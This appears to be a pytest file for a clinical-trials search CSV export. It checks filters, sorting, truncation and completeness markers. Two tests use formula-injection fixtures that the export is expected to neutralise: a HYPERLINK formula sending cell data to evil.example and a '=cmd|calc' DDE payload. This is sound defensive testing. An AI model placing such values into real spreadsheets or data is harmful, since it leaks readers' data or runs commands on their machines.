"""`POST /trials/export/` — the current search as a CSV file.

The file is the list: same filters, same sort, same narrowing. What these
tests guard is that the two do not drift apart, and that the endpoint refuses
the same questions the search refuses rather than answering them with the
wrong set.
"""
import csv
import io

import pytest
from rest_framework.authtoken.models import Token
from rest_framework.test import APIClient

from accounts.models import Identity
from trials.api import trials_views
from trials.models import Location, LocationTrial
from tests.factories import TrialFactory


@pytest.fixture
def authed_client(db):
    user, _ = Identity.objects.get_or_create(issuer='urn:local', sub='export-tester')
    token, _ = Token.objects.get_or_create(user=user)
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f'Token {token.key}')
    return client


def _csv(response):
    """The file as (header, rows-as-dicts), with the trailing sentinel dropped.

    Keyed by header rather than by position: a test that indexes `row[0]`
    fails the moment a column is added in front of it, which says nothing
    about the behaviour it was written to guard.

    `utf-8-sig`, because the file carries a BOM for Excel's sake — which is
    also the decoding any consumer of this file should use."""
    body = b''.join(response.streaming_content).decode('utf-8-sig')
    rows = list(csv.reader(io.StringIO(body)))
    header = rows[0]
    body_rows = [r for r in rows[1:] if not r[0].startswith('#')]
    return header, [dict(zip(header, r)) for r in body_rows]


def _make_locations(trial, count):
    """`count` sites on one trial. A multi-site trial with several hundred is
    ordinary, and with no patient geography the serializer lists all of them."""
    for i in range(count):
        location = Location.objects.create(
            city=f'City {i}', title=f'A fairly long hospital name number {i}',
        )
        LocationTrial.objects.create(trial=trial, location=location)


def _last_line(response):
    body = b''.join(response.streaming_content).decode('utf-8-sig')
    return [line for line in body.splitlines() if line.strip()][-1]


@pytest.mark.django_db
class TestTrialsExport:
    def test_unauthenticated_is_refused(self):
        assert APIClient().post('/trials/export/', {}, format='json').status_code == 401

    def test_streams_a_row_per_trial_under_a_header(self, authed_client):
        TrialFactory(disease='multiple myeloma', study_id='NCT001', brief_title='First')
        TrialFactory(disease='multiple myeloma', study_id='NCT002', brief_title='Second')

        response = authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        )
        assert response.status_code == 200
        assert response['Content-Type'].startswith('text/csv')
        assert 'attachment;' in response['Content-Disposition']
        assert '.csv' in response['Content-Disposition']

        header, rows = _csv(response)
        assert header[:3] == ['Trial ID', 'Study ID', 'Title']
        assert {r['Study ID'] for r in rows} == {'NCT001', 'NCT002'}

    def test_a_list_column_is_readable_rather_than_a_python_repr(self, authed_client):
        TrialFactory(disease='multiple myeloma', study_id='NCT003', phases=['PHASE2', 'PHASE3'])

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert rows[0]['Phase'] == 'PHASE2; PHASE3'

    def test_an_empty_field_is_an_empty_cell(self, authed_client):
        """Not the string "None" — a spreadsheet reads that as data."""
        TrialFactory(disease='multiple myeloma', study_id='NCT004', enrollment_count=None)

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert rows[0]['Enrolment'] == ''

    def test_it_exports_what_the_search_returns_not_the_whole_corpus(self, authed_client):
        """The narrowing is the point: a file that ignores the filters is a
        different answer to the question the reader asked on screen."""
        TrialFactory(disease='multiple myeloma', study_id='NCT005', brief_title='Myeloma study')
        TrialFactory(disease='breast cancer', study_id='NCT006', brief_title='Breast study')

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert {r['Study ID'] for r in rows} == {'NCT005'}

    def test_it_honours_a_trial_ids_narrowing(self, authed_client):
        """How a Favorites export works — the bookmarks live in PROMOP, so the
        ids come down in the body exactly as they do for the list."""
        keep = TrialFactory(disease='multiple myeloma', study_id='NCT007')
        TrialFactory(disease='multiple myeloma', study_id='NCT008')

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}, 'trial_ids': [str(keep.id)]},
            format='json',
        ))
        assert {r['Study ID'] for r in rows} == {'NCT007'}

    def test_it_refuses_the_search_types_the_search_refuses(self, authed_client):
        """`type=favorites` narrows nothing here, and a CSV headed "your
        bookmarks" holding the whole corpus is the worst place to answer a
        question with the wrong set."""
        TrialFactory(disease='multiple myeloma')
        response = authed_client.post(
            '/trials/export/?type=favorites',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        )
        assert response.status_code == 400

    def test_the_sort_reaches_the_file(self, authed_client):
        TrialFactory(disease='multiple myeloma', study_id='LOW', enrollment_count=5)
        TrialFactory(disease='multiple myeloma', study_id='HIGH', enrollment_count=500)

        _, rows = _csv(authed_client.post(
            '/trials/export/?sort=enrollment',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert [r['Study ID'] for r in rows] == ['HIGH', 'LOW']

    def test_a_title_that_looks_like_a_formula_is_neutralised(self, authed_client):
        """CB #4948. Trial titles are free text written upstream, and this file
        is opened in Excel or Sheets by a patient. A title beginning `=` becomes
        a formula on open — `=HYPERLINK`, `=WEBSERVICE`, a DDE payload —
        executing with the READER's privileges."""
        TrialFactory(
            disease='multiple myeloma',
            study_id='NCT009',
            brief_title='=HYPERLINK("http://evil.example/?x="&A1,"Click")',
            sponsor_name='@SUM(1+1)',
        )

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert rows[0]['Title'].startswith("'=HYPERLINK")
        assert rows[0]['Sponsor'].startswith("'@SUM")

    def test_a_payload_hiding_in_the_second_location_is_neutralised_too(self, authed_client):
        """The list columns are joined, and neutralising the joined string only
        would leave everything after the first separator live."""
        TrialFactory(disease='multiple myeloma', study_id='NCT010', phases=['PHASE2', '=cmd|calc'])

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert rows[0]['Phase'] == "PHASE2; '=cmd|calc"

    def test_a_number_stays_a_number(self, authed_client):
        """The apostrophe is for free text. Quoting a negative number turns a
        column the reader can sum into text that they cannot."""
        TrialFactory(disease='multiple myeloma', study_id='NCT011', enrollment_count=120)

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert rows[0]['Enrolment'] == '120'

    def test_the_mcl_rule_travels_as_one_readable_cell(self, authed_client):
        """The panel on the detail page shows this rule criterion by criterion;
        the file has one column, so it carries the verdict and the parts — in
        the reader's terms, not the server's."""
        TrialFactory(
            disease='mantle cell lymphoma',
            study_id='NCT012',
            high_risk_mcl_criteria_required=['tp53_mutation'],
            high_risk_mcl_criteria_excluded=['blastoid'],
            high_risk_mcl_criteria_min_count=1,
        )

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {
                'disease': 'mantle cell lymphoma',
                'molecular_markers': 'tp53Mutation',
                'morphologic_variant': 'classic',
            }},
            format='json',
        ))
        cell = rows[0]['High-risk MCL criteria']
        assert 'verdict=matched' in cell
        assert 'tp53_mutation — you have this' in cell
        # NOT "blastoid=matched". The server reports in eligibility terms, so
        # on an excluded criterion `matched` means the patient is confirmed
        # clear of it — and this file has no legend to explain that, in front
        # of a reader who takes it to an appointment.
        assert 'rules the trial out: blastoid — you are clear of this' in cell

    def test_a_trial_that_names_no_mcl_criteria_leaves_the_cell_empty(self, authed_client):
        TrialFactory(disease='multiple myeloma', study_id='NCT013')

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        assert rows[0]['High-risk MCL criteria'] == ''

    def test_a_complete_file_says_so_on_its_last_line(self, authed_client):
        """The status code cannot say it: it was sent before the first row, so
        a stream that dies halfway arrives as a 200 with a short file, which is
        indistinguishable from a small result."""
        TrialFactory(disease='multiple myeloma')
        TrialFactory(disease='multiple myeloma')

        response = authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        )
        assert _last_line(response) == '# end of export — 2 trials'

    def test_a_stream_that_dies_says_the_file_is_incomplete(self, authed_client, monkeypatch):
        TrialFactory(disease='multiple myeloma')
        TrialFactory(disease='multiple myeloma')

        calls = {'n': 0}
        real = trials_views._export_cell

        def explode(value):
            calls['n'] += 1
            if calls['n'] > 30:  # one whole row first, so the count is real
                raise RuntimeError('database went away')
            return real(value)

        monkeypatch.setattr(trials_views, '_export_cell', explode)
        response = authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        )
        assert response.status_code == 200, 'headers are long gone by then'
        last = _last_line(response)
        assert last.startswith('# EXPORT INCOMPLETE'), last
        # Unquoted, so it can be grepped for.
        assert not last.startswith('"')
        assert last.endswith('after 1 trials')

    def test_the_file_carries_a_bom_so_excel_reads_it_as_utf8(self, authed_client):
        """Excel ignores `charset=utf-8` on a saved file and decodes as the
        system codepage — every accented sponsor becomes mojibake."""
        TrialFactory(disease='multiple myeloma', sponsor_name='Hôpital de Genève')

        response = authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        )
        body = b''.join(response.streaming_content)
        assert body.startswith(b'\xef\xbb\xbf')
        assert 'Hôpital de Genève' in body.decode('utf-8-sig')

    def test_an_export_that_narrows_nothing_is_refused(self, authed_client):
        """A search with no patient and no filters is a page; the same export is
        the entire table, uncapped, once per request."""
        TrialFactory(disease='multiple myeloma')
        response = authed_client.post('/trials/export/', {}, format='json')
        assert response.status_code == 400
        assert 'patient_info' in str(response.data)

    def test_the_whole_catalog_is_still_reachable_when_it_is_asked_for(self, authed_client):
        """`type=all` is the deliberate form of the same request, and a caller
        asking for every trial gets every trial."""
        TrialFactory(disease='multiple myeloma', study_id='NCT014')
        TrialFactory(disease='breast cancer', study_id='NCT015')

        _, rows = _csv(authed_client.post('/trials/export/?type=all', {}, format='json'))
        assert {r['Study ID'] for r in rows} == {'NCT014', 'NCT015'}

    def test_the_stream_does_not_query_once_per_row(self, authed_client, django_assert_max_num_queries):
        """Uncapped by design, so a per-row query is a per-trial round trip
        across the whole corpus. The trial type is the one that bites: a plain
        FK the serializer reads for every row."""
        for i in range(8):
            TrialFactory(disease='multiple myeloma', study_id=f'NCT1{i:02d}')

        with django_assert_max_num_queries(12):
            response = authed_client.post(
                '/trials/export/',
                {'patient_info': {'disease': 'multiple myeloma'}},
                format='json',
            )
            _, rows = _csv(response)
        assert len(rows) == 8

    def test_explain_does_not_run_per_row_for_a_column_that_does_not_exist(
        self, authed_client, django_assert_max_num_queries,
    ):
        """`?explain=true` reaches the export from the query string and would
        run `TrialMatchExplainer` for every row — three queries each — to
        produce a `matchReasons` the CSV has no column for."""
        for i in range(8):
            TrialFactory(disease='multiple myeloma', study_id=f'NCT2{i:02d}')

        with django_assert_max_num_queries(12):
            response = authed_client.post(
                '/trials/export/?explain=true',
                {'patient_info': {'disease': 'multiple myeloma'}},
                format='json',
            )
            _, rows = _csv(response)
        assert len(rows) == 8

    def test_a_locations_cell_cannot_outgrow_the_spreadsheet(self, authed_client):
        """Excel refuses a cell past 32,767 characters, and a multi-site trial
        with no patient geography lists every site it has."""
        trial = TrialFactory(disease='multiple myeloma', study_id='NCT300')
        # Enough to pass the cap with names of a realistic length. A real
        # international trial reaches this through long site names rather than
        # through site count alone.
        _make_locations(trial, 900)

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        cell = rows[0]['Locations']
        assert len(cell) < 32_000
        # Cut, and saying so: a cell that ends mid-list reads as a trial with
        # fewer sites than it has.
        assert cell.endswith('more'), cell[-60:]

    def test_a_very_long_title_is_cut_rather_than_breaking_the_file(self, authed_client):
        """`brief_title` is an unbounded TextField and Excel refuses a cell past
        32,767 characters — one long trial title takes the whole file with
        it."""
        TrialFactory(
            disease='multiple myeloma',
            study_id='NCT400',
            brief_title='A' * 40_000,
        )

        _, rows = _csv(authed_client.post(
            '/trials/export/',
            {'patient_info': {'disease': 'multiple myeloma'}},
            format='json',
        ))
        title = rows[0]['Title']
        assert len(title) < 32_000
        assert title.endswith('more characters'), title[-40:]
